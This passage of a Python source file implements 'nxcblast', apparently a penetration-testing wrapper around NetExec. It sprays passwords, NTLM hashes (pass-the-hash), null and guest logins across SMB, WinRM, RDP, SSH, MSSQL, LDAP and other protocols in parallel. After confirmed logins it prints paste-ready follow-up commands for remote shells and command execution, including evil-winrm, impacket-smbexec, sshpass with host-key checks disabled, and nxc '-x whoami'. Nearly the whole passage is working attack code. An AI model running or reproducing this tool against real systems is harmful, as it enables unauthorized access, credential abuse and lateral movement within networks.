            lines.append(f"impacket-smbexec {spec}{extra}")
    elif proto == "winrm":
        lines.append(_nxc_cmd("winrm", t, nxc_auth, local))
        if can_exec:
            dflag = ""
            if not local and cred.domain:
                dflag = f" -d {_shell_user(cred.domain)}"
            if kind == "hash":
                lines += [
                    f"evil-winrm -i {t} -u {u} -H {nth}{dflag}",
                    _nxc_cmd("winrm", t, nxc_auth, local, "-x whoami"),
                ]
            else:
                lines += [
                    f"evil-winrm -i {t} -u {u} -p {p}{dflag}",
                    _nxc_cmd("winrm", t, nxc_auth, local, "-x whoami"),
                ]
    elif proto == "rdp":
        lines.append(_rdp_pastable(hit))
    elif proto == "ssh":
        if kind != "hash":
            ssh_user = _shell_user(cred.username or "root")
            lines.append(
                f"sshpass -p {p} ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password {ssh_user}@{t}"
            )
            lines += [
                f"ssh {u}@{t}",
                _nxc_cmd("ssh", t, nxc_auth, False),
            ]
    elif proto == "ftp":
        if kind != "hash":
            lines.append(_nxc_cmd("ftp", t, nxc_auth, False, "--ls"))
    elif proto == "ldap":
        lines.append(_nxc_cmd("ldap", t, nxc_auth, False, "--groups --computers"))
    elif proto == "mssql":
        lines.append(_nxc_cmd("mssql", t, nxc_auth, local))
        if can_exec and kind != "hash":
            lines.append(_nxc_cmd("mssql", t, nxc_auth, local, "-x whoami"))
    elif proto == "vnc":
        if kind != "hash":
            lines.append(_nxc_cmd("vnc", t, nxc_auth, False))
    elif proto == "wmi":
        lines.append(_nxc_cmd("wmi", t, nxc_auth, local))
        if can_exec:
            lines.append(_nxc_cmd("wmi", t, nxc_auth, local, "-x whoami"))

    seen: set[str] = set()
    uniq: list[str] = []
    for line in lines:
        if line not in seen:
            seen.add(line)
            uniq.append(line)
    return uniq


def render_pastables(hits: list[Hit]) -> str:
    if not hits:
        return ""
    bar = "=" * 60

    groups: dict[tuple[str, str], list[Hit]] = {}
    order: list[tuple[str, str]] = []
    for hit in hits:
        key = (hit.target, hit.cred.display)
        if key not in groups:
            groups[key] = []
            order.append(key)
        groups[key].append(hit)

    blocks: list[str] = []
    for key in order:
        group = groups[key]
        target, cred_disp = key
        host = next((h.hostname for h in group if h.hostname), "")
        target_label = f"{target} ({host})" if host else target
        body: list[str] = []
        by_proto: dict[str, list[Hit]] = {}
        proto_order: list[str] = []
        for hit in group:
            if hit.protocol not in by_proto:
                by_proto[hit.protocol] = []
                proto_order.append(hit.protocol)
            by_proto[hit.protocol].append(hit)
        for proto in proto_order:
            mode_groups: dict[str, list[Hit]] = {}
            mode_order: list[str] = []
            for hit in by_proto[proto]:
                mode = hit.auth_mode or ""
                if mode not in mode_groups:
                    mode_groups[mode] = []
                    mode_order.append(mode)
                mode_groups[mode].append(hit)
            for mode in mode_order:
                seen_cmd: set[str] = set()
                cmds: list[str] = []
                for hit in mode_groups[mode]:
                    for cmd in pastables_for_hit(hit):
                        if cmd not in seen_cmd:
                            seen_cmd.add(cmd)
                            cmds.append(cmd)
                if not cmds:
                    continue
                title = f"[{proto.upper()} {mode}]" if mode else f"[{proto.upper()}]"
                body.append(title)
                for cmd in cmds:
                    body.append(f"  {cmd}")
                body.append("")
        if not body:
            continue
        blocks.append(f"[{target_label} | {cred_disp}]")
        blocks.append("")
        blocks.extend(body)
    if not blocks:
        return ""
    return "\n".join(
        [bar, "PASTABLES -- confirmed hits, suggested follow-up commands", bar, ""]
        + blocks
        + [bar]
    )


# ---------------------------------------------------------------------------
# Jobs
# ---------------------------------------------------------------------------


def mssql_modes(args: argparse.Namespace) -> list[str]:
    selected = []
    if args.mssql_windows:
        selected.append("windows")
    if args.mssql_local:
        selected.append("local")
    if args.mssql_internal:
        selected.append("internal")
    if not selected:
        return ["windows", "local", "internal"]
    return selected


def build_jobs(
    protocols: list[str],
    targets: list[str],
    creds: list[Credential],
    args: argparse.Namespace,
) -> list[Job]:
    jobs: list[Job] = []
    modes = mssql_modes(args)
    for target in targets:
        for cred in creds:
            for proto in protocols:
                if cred.secret_is_hash and proto in HASH_SKIP_PROTOS:
                    continue
                if proto == "mssql":
                    for mode in modes:
                        extra: list[str] = []
                        job_cred = cred
                        if mode == "local":
                            extra.append("--local-auth")
                        elif mode == "internal":
                            if cred.secret_is_hash:
                                continue
                            extra.append("--local-auth")
                            job_cred = Credential(
                                username="sa",
                                password=cred.password if cred.password is not None else "",
                                domain="",
                                kind="password",
                            )
                        jobs.append(
                            Job(
                                protocol=proto,
                                target=target,
                                cred=job_cred,
                                extra_args=extra,
                                label=f"mssql-{mode}",
                            )
                        )
                    continue

                extra = []
                if args.local and proto in LOCAL_AUTH_PROTOS:
                    extra.append("--local-auth")
                    jobs.append(
                        Job(protocol=proto, target=target, cred=cred, extra_args=extra)
                    )
                    continue
                jobs.append(Job(protocol=proto, target=target, cred=cred, extra_args=extra))
                if proto in LOCAL_AUTH_PROTOS and cred.kind in {"null", "guest", "user-only"}:
                    jobs.append(
                        Job(
                            protocol=proto,
                            target=target,
                            cred=cred,
                            extra_args=["--local-auth"],
                        )
                    )
    return jobs


def group_jobs_by_lane(jobs: list[Job]) -> list[tuple[tuple[str, str], list[Job]]]:
    """One lane per (protocol, target). Creds stay serial inside each lane."""
    lanes: dict[tuple[str, str], list[Job]] = {}
    order: list[tuple[str, str]] = []
    for job in jobs:
        key = (job.protocol, job.target)
        if key not in lanes:
            lanes[key] = []
            order.append(key)
        lanes[key].append(job)
    return [(k, lanes[k]) for k in order]


HIT_COL_PROTO = 6
HIT_COL_TARGET = 16
HIT_COL_HOST = 16
HIT_COL_CREDS = 22
HIT_COL_METHOD = 6


ACCESS_LABEL = {
    "shell": "shell execution",
    "status_success": "valid",
    "guest": "guest",
    "read only": "read only",
}


def format_hit_status(hit: Hit) -> str:
    """Access-level column with nxc-like colors: green valid, bright red Pwn3d!."""
    is_pwn3d = "pwn3d" in hit.status.lower()
    # ftp authenticates but nxc never treats it as admin/Pwn3d!
    if hit.protocol == "ftp":
        is_pwn3d = False
    if is_pwn3d:
        meaning = PWN3D_MEANING.get(hit.protocol, "")
        label = f"{C.red}(Pwn3d!){C.reset}"
        if meaning:
            label += f" {C.red}{meaning}{C.reset}"
        return label
    status = hit.status.strip() or "valid"
    if "pwn3d" in status.lower():
        status = "valid"
    if status.startswith("(") and status.endswith(")"):
        inner = status[1:-1]
    else:
        inner = status
    inner = ACCESS_LABEL.get(inner.lower(), inner)
    return f"{C.green}({inner}){C.reset}"


def hit_column_header() -> str:
    proto = "PROTO".ljust(HIT_COL_PROTO)
    target = "TARGET".ljust(HIT_COL_TARGET)
    host = "HOSTNAME".ljust(HIT_COL_HOST)
    creds = "CREDS".ljust(HIT_COL_CREDS)
    method = "METHOD".ljust(HIT_COL_METHOD)
    return (
        f"{C.dim}    {proto} | {target} | {host} | {creds} | {method} | ACCESS{C.reset}"
    )


def format_hit_line(hit: Hit) -> str:
    proto = hit.protocol.upper().ljust(HIT_COL_PROTO)
    target = hit.target.ljust(HIT_COL_TARGET)
    host = (hit.hostname or "-").ljust(HIT_COL_HOST)
    cred = hit.cred.display.ljust(HIT_COL_CREDS)
    method = method_letter(hit.auth_mode).ljust(HIT_COL_METHOD)
    status = format_hit_status(hit)
    proto_s = f"{C.yellow}{proto}{C.reset}"
    return (
        f"{C.green_bold}[+]{C.reset} {proto_s} | {target} | {host} | "
        f"{cred} | {method} | {status}"
    )


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

EPILOG = r"""
examples:
  nxcblast smb,winrm targets.txt -u admin -p Password1
  nxcblast 192.168.1.10 192.168.1.11 -u admin -p Password1
  nxcblast 192.168.1.10,192.168.1.11 -u admin -p Password1
  nxcblast 192.168.1.10 -u Admin Administrator -p Password1
  nxcblast smb targets.txt -u admin,backup -p 'Summer2026!' 'Winter2026!'
  nxcblast targets.txt -u admin -p Password1
  nxcblast smb rdp 10.10.10.5 -u admin -H aad3b435b51404eeaad3b435b51404ee:DEADBEEF
  nxcblast all 192.168.1.0/24 --null --guest
  nxcblast smb 10.10.10.5 -u admin
  nxcblast smb 10.10.10.5
  nxcblast smb targets.txt -U users.txt -P passwords.txt --lockout 3 --lockout-delay 60
  nxcblast winrm,smb targets.txt --creds creds.txt --nxcdb
  nxcblast mssql 10.10.10.20 -u sa -p sa --mssql-local
  nxcblast smb 10.10.10.5 -u admin -p Password1 --local --stop-on-hit
  nxcblast targets.txt -u admin --user-only --null --guest --threads 8

Inspired by nxcspray (https://github.com/NTHSec/nxcspray).
"""


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="nxcblast",
        usage="nxcblast [protocols] [targets] [auth] [options]",
        description=(
            "Spray credentials across every NetExec protocol at once -- "
            "hits only, lockout-aware, pastables on finish."
        ),
        epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument(
        "tokens",
        nargs="*",
        metavar="PROTO|TARGET",
        help="protocols (smb,winrm or 'all') followed by target(s): file, IP, CIDR, range, comma- or space-separated",
    )
    p.add_argument(
        "--protocols",
        default="",
        help="comma/space-separated protocols (default: all)",
    )

    auth = p.add_argument_group("auth")
    auth.add_argument(
        "-u",
        nargs="+",
        metavar="USER",
        default=None,
        help="username(s): space-separated, comma-separated, or mixed",
    )
    auth.add_argument("-U", metavar="FILE", default="", help="file of usernames")
    auth.add_argument(
        "-p",
        nargs="+",
        metavar="PASSWORD",
        default=None,
        help="password(s): space-separated, comma-separated, or mixed",
    )
    auth.add_argument("-P", metavar="FILE", default="", help="file of passwords")
    auth.add_argument(
        "-H",
        nargs="+",
        metavar="HASH",
        default=None,
        help="NTLM hash(es) (pass-the-hash): space-separated, comma-separated, or mixed",
    )
    auth.add_argument(
        "--creds",
        metavar="FILE",
        default="",
        help="file of user:pass or user::hash pairs (one per line)",
    )
    auth.add_argument(
        "--nxcdb",
        action="store_true",
        help="pull known-good creds from the current nxc workspace database",
    )

    kinds = p.add_argument_group("auth type (additive)")
    kinds.add_argument(
        "--null",
        action="store_true",
        help="null session (-u '' -p ''); default when no user or password is given",
    )
    kinds.add_argument(
        "--null-user",
        action="store_true",
        help="empty username with empty password; default when no user or password is given",
    )
    kinds.add_argument(
        "--guest",
        action="store_true",
        help="guest:''; default when no user or password is given",
    )
    kinds.add_argument(
        "--user-only",
        action="store_true",
        help="username only, empty password (default when -u/-U is given without a password)",
    )
    kinds.add_argument(
        "--local",
        action="store_true",
        help="local auth (nxc --local-auth) on protocols that support it; also tried automatically for null/guest/user-only",
    )

    mssql = p.add_argument_group("mssql (default: all three when mssql is selected)")
    mssql.add_argument(
        "--mssql-windows",
        action="store_true",
        help="Windows auth against MSSQL",
    )
    mssql.add_argument(
        "--mssql-local",
        action="store_true",
        help="MSSQL local SQL auth (--local-auth)",
    )
    mssql.add_argument(
        "--mssql-internal",
        action="store_true",
        help="MSSQL internal sa auth attempt",
    )

    behav = p.add_argument_group("behavior")
    behav.add_argument(
        "--stop-on-hit",
        action="store_true",
        help="stop a protocol once a hit is found on a target (default: continue)",
    )
    behav.add_argument(
        "--lockout",
        metavar="N",
        type=int,
        default=DEFAULT_LOCKOUT,
        help=f"max unique creds per target/domain before pausing (default: {DEFAULT_LOCKOUT}; 0 disables)",
    )
    behav.add_argument(
        "--lockout-delay",
        metavar="S",
        type=float,
        default=DEFAULT_LOCKOUT_DELAY,
        help=f"seconds to wait at lockout threshold (default: {DEFAULT_LOCKOUT_DELAY})",
    )
    behav.add_argument(
        "--delay",
        metavar="S",
        type=float,
        default=0.0,
        help="seconds between each nxc call (default: 0)",
    )
    behav.add_argument(
        "--threads",
        metavar="N",
        type=int,
        default=DEFAULT_THREADS,
        help=(
            "max concurrent protocol×target lanes (default: 0 = all services "
            "against all targets at once; each lane still runs one cred at a time)"
        ),
    )

    out = p.add_argument_group("output")
    out.add_argument(
        "--log",
        metavar="FILE",
        default="",
        help="write full verbose output to file (default: nxcblast_<timestamp>.log)",
    )
    out.add_argument("--no-log", action="store_true", help="disable file logging")
    out.add_argument("--json", metavar="FILE", default="", help="write hits to JSON file")
    out.add_argument(
        "--quiet",
        action="store_true",
        help="suppress progress indicator, show only hits",
    )
    return p


def parse_protocol_token(token: str) -> Optional[list[str]]:
    if "," in token:
        parts = [p.strip().lower() for p in token.split(",") if p.strip()]
        if not parts:
            return None
        if all(p in PROTO_TOKENS for p in parts):
            return parts
        return None
    lowered = token.lower()
    if lowered in PROTO_TOKENS:
        return [lowered]
    return None


def interpret_tokens(
    tokens: list[str], protocols_flag: str
) -> tuple[list[str], list[str]]:
    protocols: list[str] = []
    if protocols_flag:
        for chunk in protocols_flag.replace(",", " ").split():
            parsed = parse_protocol_token(chunk)
            if parsed is None:
                die(f"unknown protocol: {chunk}")
            protocols.extend(parsed)

    if not tokens:
        die("missing target (file, IP, CIDR, range, or hostname)")

    i = 0
    while i < len(tokens) - 1:
        parsed = parse_protocol_token(tokens[i])
        if parsed is None:
            break
        protocols.extend(parsed)
        i += 1

    rest = tokens[i:]
    if not rest:
        die("missing target (file, IP, CIDR, range, or hostname)")
    target_raws = rest

    if not protocols or "all" in protocols:
        protocols = list(PROTOCOLS)
    else:
        seen: set[str] = set()
        uniq: list[str] = []
        for p in protocols:
            if p not in seen:
                seen.add(p)
                uniq.append(p)
        protocols = uniq
    return protocols, target_raws


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------


class RateLimiter:
    def __init__(self, delay: float) -> None:
        self.delay = delay
        self._lock = threading.Lock()
        self._next = 0.0

    def wait(self) -> None:
        if self.delay <= 0:
            return
        with self._lock:
            now = time.time()
            if now < self._next:
                time.sleep(self._next - now)
            self._next = time.time() + self.delay


def run_spray(
    nxc: str,
    jobs: list[Job],
    args: argparse.Namespace,
    lockout: LockoutTracker,
) -> list[Hit]:
    """Run all (protocol, target) lanes at once; one cred at a time per lane.

    SMB on host A, WinRM on host A, and SMB on host B can all fire together.
    Two creds against SMB on the same box stay serial so that service is not
    flooded.
    """
    hits: list[Hit] = []
    hits_lock = threading.Lock()
    done = 0
    done_lock = threading.Lock()
    total = len(jobs)
    limiter = RateLimiter(args.delay)
    lanes = group_jobs_by_lane(jobs)
    if args.threads <= 0:
        workers = max(1, len(lanes))
    else:
        workers = max(1, min(args.threads, len(lanes) or 1))

    def bump_progress(job: Job) -> None:
        nonlocal done
        with done_lock:
            done += 1
            combo = job.combo_label()
            show_progress(
                f"{_progress_bar(done, total)} {done}/{total} | "
                f"{combo} | {job.target} | {job.cred.display}"
            )

    def run_one(job: Job) -> list[Hit]:
        if lockout.shutdown.is_set():
            return []
        if lockout.should_skip(job.target, job.cred):
            return []
        if not lockout.enter(job.target, job.cred):
            return []
        try:
            if lockout.shutdown.is_set():
                return []
            limiter.wait()
            argv = build_nxc_argv(nxc, job)
            combo = job.combo_label()
            with done_lock:
                current = done + 1
            show_progress(
                f"{_progress_bar(current, total)} {current}/{total} | "
                f"{combo} | {job.target} | {job.cred.display}"
            )
            stdout = run_nxc(argv)
            log_write(
                "\n"
                + "=" * 70
                + "\n"
                + f"{utc_now()} | {argv_to_str(argv)}\n"
                + "-" * 70
                + "\n"
                + (stdout if stdout.endswith("\n") else stdout + "\n")
            )
            found, locked = parse_nxc_output(
                stdout,
                job.protocol,
                job.target,
                job.cred,
                extra_args=job.extra_args,
                label=job.label,
            )
            if locked:
                lockout.mark_locked_out(job.target, job.cred)
            return found
        finally:
            lockout.leave(job.target, job.cred)

    def run_lane(lane_jobs: list[Job]) -> None:
        for i, job in enumerate(lane_jobs):
            if lockout.shutdown.is_set():
                bump_progress(job)
                continue
            try:
                found = run_one(job)
            except Exception as exc:
                log_write(f"{utc_now()} | worker error: {exc}\n")
                bump_progress(job)
                continue
            if found:
                with hits_lock:
                    hits.extend(found)
                for hit in found:
                    emit(format_hit_line(hit))
                if args.stop_on_hit:
                    bump_progress(job)
                    for skipped in lane_jobs[i + 1 :]:
                        bump_progress(skipped)
                    return
            bump_progress(job)

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(run_lane, lane_jobs) for _, lane_jobs in lanes]
        try:
            for fut in as_completed(futures):
                if lockout.shutdown.is_set():
                    break
                try:
                    fut.result()
                except Exception as exc:
                    log_write(f"{utc_now()} | lane error: {exc}\n")
        except KeyboardInterrupt:
            lockout.shutdown.set()
            emit(c_warn("Interrupted -- collecting hits so far"))
            pool.shutdown(wait=False, cancel_futures=True)
    return hits


def install_sigint(lockout: LockoutTracker) -> Callable:
    prev = signal.getsignal(signal.SIGINT)

    def handler(signum, frame):  # type: ignore[no-untyped-def]
        if lockout.pause_active.is_set() and lockout.pause_target:
            target = lockout.pause_target
            lockout.aborted_targets.add(target)
            lockout.pause_skip.set()
            return
        lockout.shutdown.set()
        raise KeyboardInterrupt

    signal.signal(signal.SIGINT, handler)
    return prev  # type: ignore[return-value]


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------


def main(argv: Optional[list[str]] = None) -> int:
    global _quiet, _log_fh

    parser = build_parser()
    args = parser.parse_args(argv)

    if args.quiet:
        _quiet = True

    apply_default_auth(args)

    if not has_auth_method(args):
        parser.print_usage(sys.stderr)
        die(
            "refusing to run: provide a target and at least one auth method "
            "(-u/-p, -H, --creds, --nxcdb, --null, --guest, --user-only)"
        )

    if args.user_only and not (args.u or args.U):
        die("--user-only requires -u or -U")
    if args.H and not (args.u or args.U or args.creds):
        die("-H requires -u or -U")

    if args.threads < 0:
        die("--threads must be >= 0")
    if args.lockout < 0:
        die("--lockout must be >= 0")
    if args.lockout_delay < 0:
        die("--lockout-delay must be >= 0")
    if args.delay < 0:
        die("--delay must be >= 0")

    protocols, target_raws = interpret_tokens(args.tokens, args.protocols)
    nxc = find_nxc()
    targets = load_targets(target_raws)
    creds = build_credentials(args)
    if not creds:
        die("no credentials to spray (check flags / files / nxcdb)")

    jobs = build_jobs(protocols, targets, creds, args)
    if not jobs:
        die("no jobs to run (hash-only spray against SSH-only? add a password or another protocol)")

    log_path = None
    if not args.no_log:
        if args.log:
            log_path = args.log
        else:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_path = f"nxcblast_{ts}.log"
        try:
            _log_fh = open(log_path, "a", encoding="utf-8")
        except OSError as exc:
            die(f"cannot open log file {log_path}: {exc}")
        log_write(f"# nxcblast log started {utc_now()}\n")
        log_write(f"# argv: {argv_to_str([sys.argv[0]] + (argv if argv is not None else sys.argv[1:]))}\n")

    emit(
        c_info(
            f"nxcblast | protocols: {','.join(protocols)} | "
            f"targets: {len(targets)} | creds: {len(creds)}"
        )
    )
    if log_path:
        emit(c_info(f"Verbose log: {log_path}"))
    emit(
        c_info(
            "Ctrl+C skips this target during a pause; "
            "Ctrl+C otherwise stops the spray"
        )
    )

    if not args.quiet:
        print()
        print(hit_column_header(), flush=True)
        print(flush=True)

    lockout = LockoutTracker(args.lockout, args.lockout_delay)
    prev_handler = install_sigint(lockout)
    hits: list[Hit] = []
    try:
        hits = run_spray(nxc, jobs, args, lockout)
    except KeyboardInterrupt:
        emit(c_warn("Interrupted"))
    finally:
        signal.signal(signal.SIGINT, prev_handler)
        _clear_progress()

    unique_targets = {h.target for h in hits}
    print(flush=True)
    emit(
        c_info(
            f"Done. {len(hits)} hit{'s' if len(hits) != 1 else ''} "
            f"across {len(unique_targets)} target{'s' if len(unique_targets) != 1 else ''}."
        )
    )
    pastables = render_pastables(hits)
    if pastables:
        print()
        print(pastables)

    if args.json:
        try:
            Path(args.json).write_text(
                json.dumps([h.as_json() for h in hits], indent=2) + "\n",
                encoding="utf-8",
            )
            emit(c_info(f"Wrote JSON hits: {args.json}"))
        except OSError as exc:
            print(c_err(f"cannot write JSON {args.json}: {exc}"), file=sys.stderr)

    if _log_fh is not None:
        log_write(f"# nxcblast finished {utc_now()} hits={len(hits)}\n")
        _log_fh.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
